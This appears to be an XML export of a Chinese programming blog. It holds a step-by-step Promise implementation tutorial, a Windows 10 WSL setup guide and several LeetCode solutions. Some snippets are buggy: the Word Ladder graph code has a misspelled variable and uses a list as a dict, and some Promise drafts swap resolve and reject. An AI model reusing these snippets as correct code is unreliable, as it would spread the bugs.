Promise((resolve, reject) =&gt; &#123; console.log(1); fs.readFile("./hello.txt", &#123; encoding: "utf8" &#125;, function(err, contents) &#123; console.log(2); // 读取失败 if (err) &#123; reject(err); return; &#125; // 读取成功 resolve(contents); &#125;);&#125;); Promise 构造函数创建 Promise 时需要传递一个含有两个有名参数的执行函数，我们称之为 excutor，一般而言 excutor 中的有名参数统一命名为 resolve 和 reject。使用最原始的回调函数方式在 excutor 中处理异步逻辑（通常而言，这里的异步逻辑是指调用 JavaScript 执行环境提供的异步API，包括 setTimeout, setInterval, XMLHttpRequst 对象，以及 Node 环境下的很多系统调用），以异步处理结果作为实际参数调用 reject 或者 resolve。 至此，我们可以抽象 Promise 如下定义： 1234var Promise = function(excutor) &#123; // We need to define reject and resolve before call the excutor excutor(reject, resolve);&#125; 文件读取成功和失败时，分别执行 resolve 和 reject，这说明 excutor 所需的两个参数都必须是函数类型。因此在 Promise 中执行 excutor 之前需要定义两个函数类型的参数 reject 和 resolve，如下： 12345var Promise = function(excutor) &#123; function resolve(value) &#123;&#125; function reject(reason) &#123;&#125; excutor(reject, resolve);&#125; Promise 的初始状态为pending，它可以由此转为 fulfilled（一致称之为 resolved）或 rejected graph TB 0((pending)) --> |done| 1((resolved)) 0 -->|failed| -1((rejected)) 因此还需要一个 status 属性表示 Promise 的状态： 12345678var Promise = function(excutor) &#123; var self = this; self.status = 'pending'; function resolve(value) &#123;&#125; function reject(reason) &#123;&#125; excutor(reject, resolve);&#125; than 方法创建 Promise 实例后，在构造函数中执行异步逻辑，然后在 then 中获取回调结果，基本语法： 1234567myPromise.then(onResolve, onReject); // onResolve, onReject is a function with one parameter, such as:myPromise.then((data) =&gt; &#123; console.log(data);&#125;, (err) =&gt; &#123; console.log(err);&#125;); 读取文件案例如下， 12345678910111213141516171819202122const fs = require("fs");const samplePromise = new Promise((resolve, reject) =&gt; &#123; console.log(1); fs.readFile("./package.json", &#123; encoding: "utf8" &#125;, function(err, contents) &#123; console.log(2); // 读取失败 if (err) &#123; reject(err); return; &#125; // 读取成功 resolve(contents); &#125;);&#125;);// processing datasamplePromise .then((data) =&gt; &#123; console.log(data); &#125;).catch((err) =&gt; &#123; console.log(err); &#125;); 文件读取成功时，then 的 resolve 参数中的 data 参数即为 Promise 构造函数中执行 resolve 时传入的参数，也就是说 data &lt;=&gt; contents。 因此， resolve 至少应该完成两件事情： 更新 status 为 resolved 将回调数据储存起来，方便 then 方法读取 1234function resolve(value) &#123; self.status = 'resolved'; self.data = value;&#125; then 函数执行时，如果 Promise 为 resolved 状态，则执行传入的 onResolved 函数 1234567Promise.prototype.then = function(onResolved, onRejected) &#123; var self = this; if (self.status === 'resolved') &#123; return onResolved(self.data); // 读取 resolve 保存的数据做为成功的参数 &#125;&#125; 但是，Promise/A 标准中明确规定了 then 要返回一个新的 Promise 对象，所以代码应该如下： 12345678910Promise.prototype.then = function(onResolved, onRejected) &#123; var self = this; if (self.status === 'resolved') &#123; return new Promise(function(resolve, reject) &#123; var x = onResolved(self.data); resolve(x); &#125;); &#125;&#125; 需要考虑的问题是，如果调用 then 方法时 Promise 还是 pending 状态我们该怎么办？ 如果 then 函数执行时，Promise 的状态依然为 pending，那么我们无法确定后续状态是什么，因此只能将 then 的传递的参数 onResolved 先存起来，等待 Promise 状态变成之后再执行。 给构造函数添加一个 onResolveCallback 123456789var Promise = function(excutor) &#123; var self = this; self.status = 'pending'; self.onResolveCallback = function() &#123;&#125; function resolve(value) &#123;&#125; function reject(reason) &#123;&#125; excutor(reject, resolve);&#125; 将 onResolved 存储 12345678910111213141516171819Promise.prototype.then = function(onResolved, onRejected) &#123; var self = this; if (self.status === 'resolved') &#123; return new Promise(function(resolve, reject) &#123; var x = onResolved(self.data); resolve(x); &#125;); &#125; if (self.status === 'pending') &#123; return new Promise(function(resolve, reject) &#123; self.onResolveCallback = function(value) &#123; var x = onResolved(value); resolve(x); &#125; &#125;) &#125;&#125; 状态更新成 resolved 后执行 onResolveCallback 12345function resolve(value) &#123; self.status = 'resolved'; self.data = value; self.onResolveCallback(value);&#125; 整理一下上述代码梳理如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455var Promise = function(excutor) &#123; var self = this; this.status = 'pending'; this.onResolvedCallback = function() &#123;&#125;; function resolve(value) &#123; self.status = 'resolved'; self.data = value; self.onResolvedCallback(value); &#125; function reject(reason) &#123;&#125; excutor(resolve, reject);&#125;Promise.prototype.then = function(onResolved, onRejected) &#123; var self = this; if (self.status === 'resolved') &#123; return new Promise(function(resolve, reject) &#123; var x = onResolved(self.data); resolve(x); &#125;); &#125; if (self.status === 'pending') &#123; return new Promise(function(resolve, reject) &#123; self.onResolvedCallback = function(value) &#123; var x = onResolved(self.data); resolve(x); &#125; &#125;); &#125;&#125;// ----------------- Test Case ----------const fs = require("fs");console.log(2);var promise1 = new Promise(function(resolve, reject) &#123; console.log(1); fs.readFile("./package.json", function(err, contents) &#123; if (err) &#123; reject(err); &#125; resolve(contents); &#125;)&#125;).then((data) =&gt; &#123; console.log(3); console.log(data);&#125;);console.log(4); 目前代码在正常情况下，似乎可以运行并得到预期结果，只不过还有一些问题： 构造函数中的 excutor 是有外部创建的，如果执行异常应该直接 reject，如 123new Promise(function(resolve, reject) &#123; resolve(data); // data 未定义，程序异常 &#125;); 所以，构造函数应该对外部定义的函数做风险处理，then 函数中也同理 123456789101112131415161718var Promise = function(excutor) &#123; var self = this; this.status = 'pending'; this.onResolvedCallback = function() &#123;&#125;; function resolve(value) &#123; self.status = 'resolved'; self.data = value; self.onResolvedCallback(value); &#125; function reject(reason) &#123;&#125; try &#123; excutor(resolve, reject); &#125; catch(e) &#123; reject(e); &#125;&#125; 调用 then 时，如果传入的 onResolved 返回值是一个 Promise，即 x instanceof Promise，应等待 x 的状态稳定，并采用 x 的状态和值。 123456789101112var p1 = new Promise(function(resolve, reject) &#123; resolve();&#125;);var p2 = p1.then(function(data) &#123; return new Promise(function(resolve, reject) &#123; resolve(data * 10); &#125;);&#125;);p2.then((data) =&gt; &#123; console.log(data)&#125;);]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Promise</tag>
        <tag>Asynchronous</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建基于 Windows 10 和 WSL 的开发环境不完全指南]]></title>
    <url>%2Fexperience%2Fguide%2Fdev-environment-on-windows-with-wsl%2F</url>
    <content type="text"><![CDATA[零、背景前段时间博主曾经写过一篇文章《Windows 10 配合 Ubuntu 搭建舒适开发环境不完全指北》，文章介绍了如何使用 Windows 配合 Ubuntu 搭建舒适的开发环境，此后博主由于一些个人因素离开了上家公司，加入了目前的公司。不巧的是，新公司默认情况下配置的电脑也是 Windows（后来听说入职之前可以向 HR 申请 MBP，但我没有申请），而且电脑一旦配发，如无损坏需用满三年才能更换，而我特别不喜欢使用 Windows 的 Terminal 工具。一方面是开发环境部署困难，比如安装 Python 你可能需要自行下载 Python 安装镜像然后手动安装，安装完成后可能还需要配置环境变量，几乎所有的开发工具在 Windows 下的安装都是类似的；另一方面是 Terminal 界面丑陋，用户体验较差。即使有 Git Bash，Cmder，PowerShell，choco 等一系列辅助工具，还是无法赢得很多喜欢命令行工具的程序员的青睐， 我也一样。 随着 WSL 第二代和 Windows Terminal 的发布，以及几天以前微软推出了新的编程字体 https://github.com/microsoft/cascadia-code ，再次给使用 Windows 作为开发机器的程序员带来了重生的希望。但是 Windows Terminal 和 WSL 第二版必须要求 Windows 发布版本大于等于 1903，目前共同公司配备的 Windows 是 1809，恰好能用 WSL 的第一版，但不能用 Windows Terminal 和 WSL 第二版。好在 Windows 1903 的版本公司正在积极定制中，应该马上能用了，可喜可贺。 基于以上背景，本文记录了在 Windows 1809 版本下配合 WSL 第一版部署舒适开发环境的过程。 一、依赖安装 Windows Terminal 要求必须是 Windows 10系统，且系统版本 &gt;= 16237.0 按下win建，输入 about your PC ，回车后在 Windows specifications 一节中查看系统版本 二、安装 WSL2.1 开启子系统方式一：（推荐）通过命令行开启 使用管理员方式打开 PowerShell 执行如下命令： 1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 重启电脑 Win - R: 输入 shutdown -r -t 00 方式二： 使用图形化界面开启子系统功能 如果不是写作需要，我会更倾向使用命令行方式开启 WSL 功能，使用更少的操作完成更复杂的功能，这是程序员与生俱来的特点，因为时间是宝贵的。 步骤1： 按 Win - R，输入 control 后回车 步骤2： 点击 “Uninstall a program” 步骤3： 点击 “Turn Windows features on or off “ 步骤4：找到 “Windows Subsystem for Linux” 确保前面的选择框被选中 重启电脑。 2.2 安装 Ubuntu 16.04打开 Microsoft Store，输入 Ubuntu，选择评分最高的那个安装。 安装完成后，初次打开 Ubuntu Terminal 会进行初始化，输入 Ubuntu 的账号和密码，回车后等待初始化完成即可。 三、WSL 初始化 替换国内源 备份 /etc/apt/sources.list 后，使用 root 权限修改 sources.list 的内容，博主使用的是清华大学提供的镜像，内容如下： 1234567891011deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse 详细信息请查阅 https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/ 更新系统 1$ sudo apt update 安装 ssh 系统更新完成后，默认会安装旧版 openssh-server， 所以需要手动卸载旧版 openssh-server 1$ sudo apt remove openssh-server 由于旧版 openssh-server 配置和最新版不兼容，所以需要删除原来的配置 1$ sudo rm -rf /etc/ssh/* 安装 openssh-server 1$ sudo apt install openssh-server 注意： 由于 WSL 和 Windows 共享端口，而 22 端口被 Windows 占用，所以需要手动更换 ssh 的端口或者确保 Windows 的 22 端口可用且防火墙开启 22 端口，显然更换 WSL 的 ssh 端口会简单一些，如下： 打开 sudo vim /etc/ssh/sshd_config，将 Port 22 改成 Port 2222 （或者其他可用端口） 启动 ssh 1$ sudo service ssh start 正常启动后即可在 Windows 下使用 SSH 工具连接到 WSL，其中地址是 127.0.0.1 或者 localhost，端口和用户密码安装自定义的填写。 搭建开发环境 根据需要，安装好 Python/Node.js/NVM/Git/Docker 等工具。 注意： WSL 第一版中并没有使用真正的 Linux 的内核，因此导致 Dockerd 不可用，如需使用 Dockerd，请使用 WSL 2，具体参考 https://docs.microsoft.com/en-us/windows/wsl/wsl2-about 初始化项目 WSL 初始化完成后，将 Windows 的某个盘（如 d）划分为开发盘，Windows 的所有磁盘会被挂在到 /mnt/ 目录下，进入 /mnt/d/ 工作目录，克隆项目到此处，开始愉快的开发。:) 备注： 挂载在 WSL 下的 Windows 目录会带有绿色背景，这种色调对我来讲特别不舒服，就像是总在提示我不是真正的 Linux 文件系统，而是 Windows 挂在进来的 NTFS 系统一样。为了去掉绿色背景，我改了一下目录配色方案： 12$ touch ~/.dir_colors$ echo "OTHER_WRITABLE 35;40" &gt; ~/.dir_colors 在 .bashrc 末位添加一行： 1eval `dircolors $HOME/.dir_colors` source 一下 .bashrc 1$ source ~/.bashrc WSL 和项目初始化完成后，在 Windows 机器下使用相应编辑器或者 IDE 进行开发，开发完成后，在WSL中编译运行，爽哉！特别是最近在 VS Code 对 WSL 原生支持后，中小项目甚至可以将项目目录直接放在 WSL 里面，参考 https://code.visualstudio.com/docs/remote/wsl，只不多这种方式只能应付中小型项目，项目大到一定程度时可能需要专业的开发工具，如 WebStorm 。像 WebStorm 这类开发工具对 WSL 没有原生支持，无法打开（WSL的目录可以在Windows中被编辑，但是不能这样做，这样会导致权限出错）在 WSL 里面的项目，如果项目目录在 WSL 里面，这时要在 Windows 下开发就必须将 WSL 里的目录映射到 Windows 上，Samba 服务可以实现。经过笔者的实践表明，小项目使用何种方式开发都可以，当项目大一定程度后， VS Code 已经无法智能补全了，这时候使用 IDE 也许是更好的选择。这种场景下，使用 WebStorm 打开 Samba 共享出来的项目目录开发会变得异常卡顿，所以最优的选择还是直接将项目放在 Windows 下，使用 IDE 直接打开 NTFS 系统中的项目文件，然后挂载进 WSL 中编译运行。 提示：在 Windows 中使用 IDE 开发项目时，可以将 IDE 的 Terminal 绑定成 WSL，如JetBrains 设置 Teminal 为 WSL 四、踩过的坑 openssh-server 新旧版本配置不兼容，需删除旧配置再安装新版本 Ubuntu 18.04 的 WSL 无法安装 Samba 服务，Samba 服务在 WSL 下安装异常复杂，需要关闭 Windows 下的一些服务，释放占用的 139 和 445 端口。 VS Code Remote + WSL 开发方式只适用于小项目，大型项目背景下， VS Code 索引文件不太友好，智能提示几乎崩溃 WSL + Samba + WebStorm 在大项目背景下开发异常卡顿，甚至卡死。]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-938 Range Sum of BST]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-938-range-sum-of-bst%2F</url>
    <content type="text"><![CDATA[Description题目描述https://leetcode.com/problems/range-sum-of-bst/ 给定一颗二叉搜索树，返回节点的值在 L 和 R 之间的所有节点（包括 L 和 R）的和，其中二叉搜索树的所有节点的值唯一。r如下案例： Example 1: 12Input: root = [10,5,15,3,7,null,18], L = 7, R = 15Output: 32 Example 2: 12Input: root = [10,5,15,3,7,13,18,1,null,6], L = 6, R = 10Output: 23 分析二叉搜索树（Binary Search Tree）是一颗空树或者具有如下性质的二叉树： 若任意节点的左子树不空，则左子树所有节点的值均小于他的根节点的值 若任意节点的右子树不空，则右子树所有节点的值均大于他的根节点的值 任意节点的左、右子树也分别是二叉搜索树 没有键值相等的节点 根据二叉搜索树的特点，假设 L 小于 R，我们按照如下规则查找 L 和 R： 若根节点的值大于 R，则 L 和 R 都在左子树中，递归查找左子树 12if root.val &gt; R: // recursive 若根节点的值小于 L，则 L 和 R 都在右子树中，递归查找右子树 否则说明根节点在 R 和 L 中间，累加根节点的值，分别往左右两边查找 L 和 R，直到 L 和 R 都被找到，查找的过程中，累加在 R 和 L 中间的节点的值 程序设计根据如上分析，写出如下代码 12345678910class Solution: def rangeSumBST(self, root: TreeNode, L: int, R: int) -&gt; int: if not root: return 0 if root.val &gt; R: return self.rangeSumBST(root.left, L, R) if root.val &lt; L: return self.rangeSumBST(root.right, L, R) return root.val + self.rangeSumBST(root.left, L, R) + self.rangeSumBST(root.right, L, R)]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>DFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-127 Word Ladder]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-127-word-ladder%2F</url>
    <content type="text"><![CDATA[描述https://leetcode.com/problems/word-ladder/ 给定两个单词 beginWord ，endWord 和一组单词列表，求从 beginWord 到 endWord 的最短转换序列的长度，其中转换规则如下： 每次只能转换一个字母 每次转换后的单词都必须在给定的单词列表中 分析如下案例, 123456789Input:beginWord = &quot;hit&quot;,endWord = &quot;cog&quot;,wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]Output: 5Explanation: As one shortest transformation is &quot;hit&quot; -&gt; &quot;hot&quot; -&gt; &quot;dot&quot; -&gt; &quot;dog&quot; -&gt; &quot;cog&quot;,return its length 5. 首先使用（给定的单词和单词列表中的）每个单词作为一个顶点，构建连通图，如果两个顶点之间只相差一个字母，则两点之间可达。作图如下， 显然，问题的本质在于图的搜索，即从 beginWord 起始搜索 endWord，如果找到，返回最小路径，否则返回 0。那么问题分两部： 构建无向图 搜索 求解 列表构建无向图，使用二维 map。其中两个顶点的连通性有他们之间的字母差异数决定，当且仅当两顶点的单词相差 1 个字母时连通。 1234567grahp = []wordList.append(beginWord)for x in wordList: if x not in graph: grahp[x] = &#123;&#125; for y in wordList: grahp[x][y] = acessiable(x, y) 其中 accessiable 函数如下定义： 12345678910def acessiable(a, b): if len(a) != len(b): return False i, diff = 0, 0 while i &lt; len(a): if a[i] != b[i]: diff += 1 i += 1 return diff == 1]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Graph</tag>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-5 Longest palindromic substring]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-05-longest-palindromic-substring%2F</url>
    <content type="text"><![CDATA[题目描述Given a string s, find the longest palindromic substring in s. You may assume that the maximum length of s is 1000. Example 1: 123Input: &quot;babad&quot;Output: &quot;bab&quot;Note: &quot;aba&quot; is also a valid answer. Example 2: 12Input: &quot;cbbd&quot;Output: &quot;bb&quot; 分析给定一个字符串，求该字符串的最大回文字串的长度。如果一个字符串正序和逆序完全相同，则我们认为这个字符串是一个回文字符串。根据定义，若长度为 n 的字符串是回文字符串，则 P[0] = P[n]。 以 babad 为例，按照如下步骤查找最大回文字串， 因为字符串 babad 首位和末位不同，即 $b \neq d$，因此最长回文串要么在 baba 中，要么在 abad 中。(如果首位和末位相同时，如 aba 或 abfbda，如果当前字符串是回文字串，则当前字符串为当前问题的最长回文字串) 根据步骤 1 分别求 baba 和 abad 中的最长回文字串，他们中的最优解既是原原问题的最优解 原问题的最优解由一个或多个子问题的最优解组合而成，我们认为问题满足最优子结构。 像这样满足最优子结构且子问题有重叠的问题我们使用动态规划解决。 通常按照如下 4 个步骤来设计一个动态规划算法： 刻画最优解的结构特征 递归定义最优解的值 计算最优解的值，通常采用自底向上的方法 利用计算出的信息构造一个最优解 第一步：刻画最优解的结构特征记 $ X = &lt;x_1, x_2, …, x_m&gt;$，$Z = &lt;z_1, z_2, …, z_k&gt; $ ，若 Z 是 X 的一个最大回文字串，记 $P(X_{1,m}) = Z$则 若 $X_{1,m}$ 是回文字符串，则 Z = X 否则 $Z \in {P(X_{1,m-1}), P(X_{1, m-1}) }$ 第二步：递归定义最优解的值根据最优解的特征，最优解的值满足如下公式： 其中 $p(i, j)$ 表示$X_{i, j}$ 的最大回文串长度，即最优解的值。 第三步： 计算最优解根据前面分析，写出代码如下： 1234567891011121314151617181920212223242526class Solution: def longestPalindrome(self, s: str) -&gt; str: if len(s) &lt;= 1: return s def isPalindrome(i, j): while i &lt; j: if s[i] != s[j]: return False i += 1 j -= 1 return True dp = [[""] * len(s) for i in range(len(s))] def helper(i, j): if dp[i][j] != "": return dp[i][j] if isPalindrome(i, j): dp[i][j] = s[i:j+1] return dp[i][j] r = helper(i+1, j) l = helper(i, j-1) dp[i][j] = r if len(r) &gt; len(l) else l return dp[i][j] helper(0, len(s)-1) return dp[0][len(s)-1] 提交时 101/103 测试用例通过， 最后两个超时了。分析原因，代码中 isPalindrome 方法用于判断 s[i:j+1] 是否是回文字符串，此处子没有缓存结果导致子问题重复计算，参考 Berry 大神的解法做出如下改进： 12345678910111213141516171819202122232425262728class Solution: def longestPalindrome(self, s: str) -&gt; str: if len(s) &lt;= 1: return s dp = [[""] * len(s) for i in range(len(s))] def helper(i, j): if i &gt; j: return "" if dp[i][j] != "": return dp[i][j] if i == j: dp[i][j] = s[i] return dp[i][j] if s[i] == s[j]: mid = helper(i+1, j-1) if len(mid) == j - i + 1 - 2: dp[i][j] = s[i:j+1] return dp[i][j] r = helper(i+1, j) l = helper(i, j-1) dp[i][j] = r if len(r) &gt; len(l) else l return dp[i][j] helper(0, len(s)-1) return dp[0][len(s)-1] 如果 s[i] == s[j]，递归对 [i+1, j-1] 区间求解，如果解恰的长度恰好等于 j - i + 1 - 2，则说明s[i:j+1] 是回文字串。 改进: 使用 lru_cache 可以对函数结果进行缓存，结果如下： 1234567891011121314151617181920from functools import lru_cacheclass Solution: def longestPalindrome(self, s: str) -&gt; str: @lru_cache(None) def dfs(i, j): if i &gt; j: return "" if i == j: return s[i] if s[i] == s[j]: mid = dfs(i+1, j-1) if len(mid) == j - i + 1 - 2: return s[i:j+1] l, r = dfs(i, j-1), dfs(i+1, j) return l if len(l) &gt; len(r) else r return dfs(0, len(s)-1)]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-739 Daily Temperatures]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-739-daily-temperatures%2F</url>
    <content type="text"><![CDATA[DescriptionGiven a list of daily temperatures T, return a list such that, for each day in the input, tells you how many days you would have to wait until a warmer temperature. If there is no future day for which this is possible, put 0 instead. For example, given the list of temperatures T = [73, 74, 75, 71, 69, 72, 76, 73], your output should be [1, 1, 4, 2, 1, 1, 0, 0]. Note: The length of temperatures will be in the range [1, 30000]. Each temperature will be an integer in the range [30, 100]. 分析给定一个数组代表每天的气温，查找多少天之后天气比今天更暖和。首先，想到了暴力算法，如下， 遍历 T 对于第 i 个元素，另 j = i，从 i 开始往后寻找比 T[i] 大的元素，如果找到则 j - i 为第 i 号元素的目标值 重复步骤 2 直到最后一位 给定数组为降序排列时，暴力算法复杂度为 O(n^2)，数组的长度在 [1, 30000]，暴力算法可能会超时。迫于没有想到更好的解题思路，只能对暴力算法先做优化，如果数组是升序的，算法复杂都是 O(n)，所以很乐观，主要考虑优化降序的部分。 考虑如下情况，数组先增后降， 下降转折点到末尾数组元素单调递减，因此每个元素后面都不会有大于他们的元素 如果单调递减后有转折点，那么单调递减的部分元素可能会存在]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-1143 Longest Common Subsequence]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-1143-longest-common-subsequence%2F</url>
    <content type="text"><![CDATA[DescriptionGiven two strings text1 and text2, return the length of their longest common subsequence. A subsequence of a string is a new string generated from the original string with some characters(can be none) deleted without changing the relative order of the remaining characters. (eg, “ace” is a subsequence of “abcde” while “aec” is not). A common subsequence of two strings is a subsequence that is common to both strings. If there is no common subsequence, return 0. Example 1: 123Input: text1 = &quot;abcde&quot;, text2 = &quot;ace&quot; Output: 3 Explanation: The longest common subsequence is &quot;ace&quot; and its length is 3. Example 2: 123Input: text1 = &quot;abc&quot;, text2 = &quot;abc&quot;Output: 3Explanation: The longest common subsequence is &quot;abc&quot; and its length is 3. Example 3: 123Input: text1 = &quot;abc&quot;, text2 = &quot;def&quot;Output: 0Explanation: There is no such common subsequence, so the result is 0. Constraints: 1 &lt;= text1.length &lt;= 1000 1 &lt;= text2.length &lt;= 1000 The input strings consist of lowercase English characters only. 分析这是经典的最长公共字串(LCS)问题，给定两个字符串，求他们的最长字串的长度。显然，这是一个动态规划问题，这类问题可以有很多可行解，每个解都对应一个值，本例中我们只需要找最优值即可，并不需要刻画最优解。如下案例，X 和 Y 的最长公共子串有 4 个（最优解有 4 个）， 123X = "abcde"Y = "acbed"LCS = ["ace","abd","abe", "acd"] 我们通常按照如下 4 个步骤来设计一个动态规划算法： 刻画最优解的结构特征 递归定义最优解的值 计算最优解的值，通常采用自底向上的方法 利用计算出的信息构造一个最优解 步骤1：刻画最优解的结构特征按照动态如上给出的求解步骤，我们首先刻画最优解的结构特征， 设 $ X = &lt;x_1, x_2, …, x_m&gt;, Y = &lt;y_1, y_2, …, y_n&gt; $，其中$Z = &lt;z_1, z_2, …, z_k&gt; $ 是 X 和 Y 的一个最长公共字串，记为 $LCS(X, Y) = Z$。 那么 Z 的最后一位$z_k$ 至少于 X 和 Y 中的最后一位的其中之一相等（也可以都相等），参考如下案例便于理解： 12345678910111213case 1: X = "abcde" Y = "acbed" Z = "ace"case 2: X = "abcde" Y = "acbed" Z = "acd" case 3: X = "abcde" Y = "acbe" Z = "ace" 基于以上情况， 如果 X 和 Y 最后一位相等，则 $z_k = x_m = y_n 且 z_{k-1} \in LCS(X, Y)$ 如果 X 和 Y 的最后一位不等，当 $z_k \neq x_m$ 时，$ z \in LCS(X_{m-1}, Y)$ 如果 X 和 Y 的最后一位不等，当 $z_k \neq y_n$ 时，$ z \in LCS(Y_{n-1}, X)$ 步骤2：递归定义最优解的值分治是将问题化为互不相交的子问题，然后递归的求解子问题，最后将子问题的解组合起来，求出原问题的解。而动态规划适用于子问题重叠的情况，原问题的最优解是由子问题最优解组合而成，求解原问题的解只需要求解部分子问题的解。 按照动态规划的求解步骤，第二步是递归定义最优解的值，在本例中，最优解的值即为最长公共字串的长度。定义 $c[i, j] = lcslen(X_i, Y_j)$ 表示 X 的前 i 个元素和 Y 的前 j 个元素构成的最优解的值，则 步骤3：计算最优解的值有了前两步的分析，计算最优解的值就已经看到曙光了，使用自底向上的方法，递推式的从问题最小规模开始计算，递推到原问题规模时结束。本例中，如果 i 或 j 等于0 (可理解为空字符串与任何字符串的最大公共字串长度为0)时，c[i, 0] = 0, c[0, j] = 0，所以可以如下初始化 c: 1234m = len(x)n = len(y)// 问题从规模 0 开始到规模 m 需要 m + 1 个存储空间c = [[0] * (m + 1) for i in range(n + 1)] 然后如下递推计算各个状态下的最优解： 123456for i in range(1, m+1): for j in range(1, n+1): if x[i-1] == y[j-1]: c[i][j] = c[i-1][j-1] + 1 else: c[i][j] = max(c[i-1][j], c[i][j-1]) 其中 x[i-1] 代表的是第 i 号元素，计数从 1 开始，元素下标从 0 开始 完整代码如下： 1234567891011121314class Solution: def longestCommonSubsequence(self, x: str, y: str) -&gt; int: m = len(x) n = len(y) c = [[0] * (n + 1) for i in range(m + 1)] for i in range(1, m+1): for j in range(1, n+1): if x[i-1] == y[j-1]: c[i][j] = c[i-1][j-1] + 1 else: c[i][j] = max(c[i-1][j], c[i][j-1]) return c[m][n] 提交后，成功 AC。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-202 Happy Number]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-202-happy-number%2F</url>
    <content type="text"><![CDATA[DescriptionWrite an algorithm to determine if a number is “happy”. A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers. Example: 1234567Input: 19Output: trueExplanation: 12 + 92 = 8282 + 22 = 6862 + 82 = 10012 + 02 + 02 = 1 分析Happy Number 按照计算规则最终会止于 1，来看一个非 Happy Number 的会怎样，我们尝试一下 20， 123456720 -&gt; 4 -&gt; 16 -&gt; 37 -&gt; 58 -&gt; 90 -&gt; 81 ^ | | v | 65 | | | v 61 &lt;- 56 &lt;- 64 &lt;- 80 观察发现，非 Happy Number 按照计算规则生成的数据链会成环，最终无法终止。所以我们只需要将计算结果保存在 HashMap 中，按照计算规则生成一个数时判断这个数是否在 HashMap 中，如果存在则说明会成环，该数不是 Happy Number。 程序设计按照如上分析，程序设计时拆分两个步骤， 按照计算规则生成下一个数 判断是否是 Happy Number 代码如下， 123456789101112131415class Solution: def isHappy(self, n: int) -&gt; bool: memo = &#123;&#125; next = n while True: next = self.genarate(next) if next == 1: return True if memo.get(next): return False memo[next] = True def genarate(self, n: int) -&gt; int: pass 其中 genarate 函数按照规则生成新的值，实现如下 12345678def genarate(self, n: int) -&gt; int: sum = 0 while (n != 0): d = n % 10 sum += d * d n = n // 10 return sum 提交后 AC，完整代码如下： 123456789101112131415161718192021class Solution: def isHappy(self, n: int) -&gt; bool: memo = &#123;&#125; next = n while True: next = self.genarate(next) if next == 1: return True if memo.get(next): return False memo[next] = True def genarate(self, n: int) -&gt; int: sum = 0 while (n != 0): d = n % 10 sum += d * d n = n // 10 return sum 优化由分析得出，本体的关键点在于判断是否成环，以上解法使用 HashMap (或 HashSet)，空间复杂度为 O(n)，n 为链表的长度，如果要优化空间复杂度可以使用 Floyd 判断圈算法。Leetcode 题目之 Linked List Cycle 解法参考以前写的文章 链表有环]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-898 Add to Array-Form of Integer]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-989-add-to-array-form-of-integer%2F</url>
